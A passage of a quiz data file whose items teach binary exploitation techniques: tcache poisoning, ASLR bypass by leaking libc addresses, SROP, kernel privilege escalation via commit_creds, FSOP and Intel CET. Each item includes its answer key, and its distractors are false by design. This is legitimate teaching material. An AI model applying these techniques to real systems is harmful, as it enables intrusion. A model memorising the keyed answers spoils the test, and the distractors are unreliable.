      "Corrupting fd causes free() on the next same-sized chunk to write its heap metadata into the address stored in fd — this is an indirect write primitive rather than an allocation primitive, requiring a second free to trigger.",
    ],
    correctIndex: 0,
    explanation:
      "tcache is a singly-linked LIFO of freed chunks; a UAF/overflow that rewrites the fd pointer redirects a later malloc to arbitrary memory. Use-after-free and double-free are the enabling bugs.",
  },
  {
    slug: "binexp-l3-aslr-bypass",
    competencyId: "binexp",
    depthTier: 3,
    sectionHeading: "ASLR bypass techniques",
    prompt: "You have a stack overflow in a non-PIE binary with ASLR. You can control execution once and the binary links libc dynamically. You need to call system('/bin/sh') but libc's address is randomized. Why does your exploit first call puts(got['puts']) before returning to main?",
    options: [
      "To leak the runtime address of puts from the GOT — since the GOT entry holds puts' resolved libc address, printing it reveals where libc was loaded this run, letting you compute system() and '/bin/sh' offsets for the second-stage payload.",
      "To corrupt the GOT entry for puts with a partial overwrite — puts(got['puts']) triggers a self-referential write that replaces the stored address with a known fixed offset, effectively disabling ASLR for that function only.",
      "To trigger a re-link of all GOT entries at a predictable base — calling any PLT function through its own GOT entry forces the dynamic linker to reload libc at a fixed address for the remainder of the process lifetime.",
      "To flush the CPU's address-translation cache (TLB) — calling puts on its own GOT entry forces a TLB invalidation that causes libc to be remapped at its compile-time default base address on the next function call.",
    ],
    correctIndex: 0,
    explanation:
      "Leaking a known libc function's real address defeats ASLR by revealing the library base; from there you compute system/'/bin/sh' and build the second-stage ret2libc. Partial overwrites and (on 32-bit) brute force are alternatives.",
  },
  {
    slug: "binexp-l3-srop",
    competencyId: "binexp",
    depthTier: 3,
    sectionHeading: "Sigreturn-Oriented Programming (SROP)",
    prompt: "You have a stack overflow and can set rax to 15 (the sigreturn syscall number) and reach a syscall;ret gadget, but you have no other useful gadgets for setting individual registers. How does SROP let you set rdi, rsi, rdx, and rip all at once?",
    options: [
      "You forge a signal frame on the stack with your desired register values — when sigreturn executes, the kernel restores all registers (rdi, rsi, rdx, rsp, rip, etc.) from this forged frame, giving you full register control with just one gadget.",
      "SROP chains 15 consecutive pop-reg; ret gadgets derived from the sigreturn syscall's microcode — the CPU expands the single syscall instruction into individual register loads that execute during kernel trap handling.",
      "SROP overwrites the interrupt descriptor table so that syscall 15 branches to a custom handler you place on the stack — this small assembly stub loads rdi/rsi/rdx from stack offsets you control before jumping to your target.",
      "SROP exploits a race condition in the kernel's signal delivery path — if rax equals 15 during a context switch, the kernel skips the standard signal mask check and loads register values from the userspace stack without verification.",
    ],
    correctIndex: 0,
    explanation:
      "When a signal returns, the kernel restores the full register set from the sigframe; forging that frame (needing only a syscall;ret gadget and control of rax) sets rax/rdi/rsi/rdx/rip together — powerful with minimal gadgets.",
  },
  // ══ binexp L4 ══
  {
    slug: "binexp-l4-adv-heap",
    competencyId: "binexp",
    depthTier: 4,
    sectionHeading: "Advanced heap techniques",
    prompt: "You are exploiting tcache poisoning on glibc >= 2.32 and find that simply overwriting a freed chunk's fd pointer no longer produces an arbitrary allocation. Inspecting memory, fd appears mangled. What changed, and what additional leak do you need?",
    options: [
      "glibc 2.32 introduced safe-linking: fd is stored as (chunk_addr >> 12) XOR real_fd, so forging a valid fd requires knowing the chunk's heap address to reverse the XOR — you need a heap address leak before you can poison tcache.",
      "glibc 2.32 encrypts fd using AES-128 with a per-process key derived from the stack canary — reversing it requires leaking the canary first and then computing the AES round keys to encrypt your target address correctly.",
      "glibc 2.32 stores a cryptographic HMAC alongside each fd pointer using HMAC-SHA256 — the allocator verifies the MAC before following fd, so you must leak the HMAC secret key from glibc's .bss segment to forge valid entries.",
      "glibc 2.32 moved all tcache metadata into a kernel-only page mapped with PROT_NONE — user-space writes to fd now trigger SIGSEGV, so you must find a kernel bug to modify the fd pointer from ring 0.",
    ],
    correctIndex: 0,
    explanation:
      "Safe-linking XORs the fd with the chunk's shifted address, so tcache/fastbin poisoning needs a heap leak. The House-of-* families (Force, Spirit, Lore, Orange, Einherjar) attack different allocator invariants.",
  },
  {
    slug: "binexp-l4-kernel",
    competencyId: "binexp",
    depthTier: 4,
    sectionHeading: "Kernel exploitation basics",
    prompt: "You discover a use-after-free in a Linux kernel ioctl handler and can reclaim the freed kernel object with user-controlled data. What is the typical end goal once you achieve a write primitive in kernel space?",
    options: [
      "Privilege escalation to root — the standard technique calls commit_creds(prepare_kernel_cred(0)) to replace the current process's credentials with a zeroed (root) credential structure, then returns cleanly to userspace as UID 0.",
      "Disabling ASLR system-wide by writing zero to the KASLR entropy field in the kernel's .data section — once KASLR is off, you can hardcode kernel addresses and exploit any other process from userspace directly.",
      "Replacing the kernel's system call table with a custom table that routes all future syscalls through a user-space handler, effectively creating a persistent rootkit without needing to modify any files on disk.",
      "Triggering a kernel panic that forces a crash dump to /var/crash — you then parse the crash dump offline to extract all process credentials, SSH keys, and TLS session keys from the raw physical memory snapshot.",
    ],
    correctIndex: 0,
    explanation:
      "Kernel exploits (UAF in SLAB objects, ioctl bugs, TOCTOU races) aim to run commit_creds(prepare_kernel_cred(0)) or overwrite current's creds for root. Mitigations: KASLR, SMEP, SMAP, KPTI.",
  },
  {
    slug: "binexp-l4-fsop",
    competencyId: "binexp",
    depthTier: 4,
    sectionHeading: "File Stream Oriented Programming (FSOP)",
    prompt: "You have a heap overflow that can corrupt the stdout FILE structure in glibc. You want to redirect code execution when the program later calls fflush(stdout). Which field in the FILE structure do you target?",
    options: [
      "The vtable pointer — FILE objects contain a pointer to a table of function pointers (like __overflow and __sync); corrupting it to point to a fake vtable causes fflush to call your attacker-controlled function pointer instead of the real one.",
      "The _fileno field — changing it from 1 (stdout) to a file descriptor pointing to a shared-memory region tricks fflush into writing the buffer contents into executable memory, where they run as shellcode upon the next read.",
      "The _IO_buf_base field — setting it to a GOT entry address causes fflush to overwrite that GOT entry with the FILE buffer's contents, and on the next call to the GOT function, execution jumps to your embedded payload.",
      "The _flags field — setting specific bits in _flags switches the FILE stream into an 'execute mode,' a legacy glibc feature that interprets the buffer contents as function pointers and calls them sequentially during a flush.",
    ],
    correctIndex: 0,
    explanation:
      "FILE objects (stdin/stdout/stderr) carry a vtable of function pointers; corrupting it and triggering a stream operation redirects execution. glibc 2.24+ added vtable checks, bypassed via _IO_str_overflow.",
  },
  // ══ binexp L5 ══
  {
    slug: "binexp-l5-malloc",
    competencyId: "binexp",
    depthTier: 5,
    sectionHeading: "glibc malloc internals",
    prompt: "You are debugging a heap exploit and examine a 64-byte chunk after it is freed into the unsorted bin. The memory at offset 0x10 (where user data began) now contains two 8-byte pointers. What are these pointers and what structure do they form?",
    options: [
      "They are fd and bk — forward and backward pointers that link this chunk into a doubly-linked list. The unsorted bin reuses the space that held user data to chain freed chunks for coalescing and reuse by the allocator.",
      "They are prev_size and next_size — the allocator stores the sizes of adjacent chunks in the user data area after freeing, enabling O(1) coalescing by reading neighboring sizes without traversing the heap linearly.",
      "They are guard and checksum — glibc writes a random guard value and its CRC-32 checksum into freed chunks to detect corruption; malloc verifies them before reallocation and aborts if either value is wrong.",
      "They are key and nonce — glibc's ASLR-hardened allocator encrypts the chunk's metadata using a per-arena key and nonce stored in the freed data area, which must be decrypted before the chunk can be reallocated.",
    ],
    correctIndex: 0,
    explanation:
      "A free chunk reuses its user-data area for fd/bk pointers linking it into a bin. tcache/fastbin are LIFO singly-linked; unsorted/small/large bins are doubly-linked — the structures every heap technique manipulates.",
  },
  {
    slug: "binexp-l5-elf",
    competencyId: "binexp",
    depthTier: 5,
    sectionHeading: "ELF binary internals",
    prompt: "You call printf for the first time in a dynamically-linked, non-PIE binary. Stepping through GDB, the PLT stub jumps to a GOT entry that initially points back into the PLT. After the call, that same GOT entry holds printf's real libc address. What mechanism caused this?",
    options: [
      "Lazy binding — the GOT entry initially points to the PLT's resolver stub, which invokes the dynamic linker to resolve printf's symbol, then patches the GOT with the real address so subsequent calls jump directly to printf without resolver overhead.",
      "Eager preloading — the GOT always contains the real address at load time, but GDB's breakpoint on the PLT stub caused the debugger to display a stale cached address until the call completed and GDB refreshed its memory view.",
      "Copy relocation — the dynamic linker copied printf's entire machine code from libc into the binary's GOT region at the first call, so the GOT entry now points to a local copy that executes without any shared-library indirection.",
      "On-demand JIT compilation — the PLT stub invokes glibc's just-in-time compiler on the first call to generate an optimized, architecture-specific version of printf in a new executable page, and the GOT is patched to point there.",
    ],
    correctIndex: 0,
    explanation:
      "First call: PLT -> GOT -> resolver -> GOT patched with the real address; subsequent calls jump straight through. Partial RELRO leaves .got.plt writable (GOT-overwrite target); Full RELRO makes it read-only.",
  },
  {
    slug: "binexp-l5-cfi",
    competencyId: "binexp",
    depthTier: 5,
    sectionHeading: "Modern exploitation: CFI and shadow stacks",
    prompt: "A target binary uses Intel CET with a hardware shadow stack. Your stack overflow successfully overwrites the saved return address on the main stack, but the program faults at ret instead of jumping to your ROP chain. Why?",
    options: [
      "The shadow stack holds a hardware-protected copy of return addresses — ret compares the main-stack return address against the shadow-stack copy, detects the mismatch caused by your overflow, and raises a control-protection fault (#CP).",
      "Intel CET encrypts each return address on the stack using a per-function key — your overwritten address fails decryption, producing an invalid instruction pointer that triggers a general-protection fault (#GP) at the ret instruction.",
      "The shadow stack stores a hash of the call stack depth — your ROP chain increases the depth beyond what was originally recorded, and the depth-mismatch check at ret triggers a stack-overflow exception rather than a control-flow fault.",
      "Intel CET marks all ret instructions as privileged (ring 0 only) in user-mode binaries — the program faults because ret requires kernel privilege under CET, and only call-preceded indirect branches are allowed in user mode.",
    ],
    correctIndex: 0,
    explanation:
      "The shadow stack stores return addresses separately; RET compares against it, so overwriting the normal stack return no longer works. Attackers turn to data-only / Data-Oriented Programming, which control flow integrity can't catch.",
  },
];
